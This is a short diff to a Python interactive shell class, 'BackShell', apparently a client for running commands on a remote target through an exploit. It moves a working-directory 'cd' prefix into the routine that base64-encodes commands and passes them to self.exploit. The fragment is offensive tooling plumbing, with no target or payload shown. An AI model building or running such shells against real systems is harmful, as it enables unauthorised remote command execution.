@@ -114,6 +114,8 @@ class BackShell(Cmd):
             command = command[:-1] + redirect + ' &'
         else:
             command += ' ' + redirect
+        if self.cwd:
+            command = 'cd {};'.format(self.cwd) + command
         logging.debug(command)
         encoded = base64.b64encode(command.encode()).decode()
         try:
@@ -177,8 +179,6 @@ class BackShell(Cmd):
         self.cwd = arg
 
     def default(self, command: str) -> None:
-        if self.cwd:
-            command = 'cd {};'.format(self.cwd) + command
         print(self.exploit(command))
 
     def preloop(self) -> None:
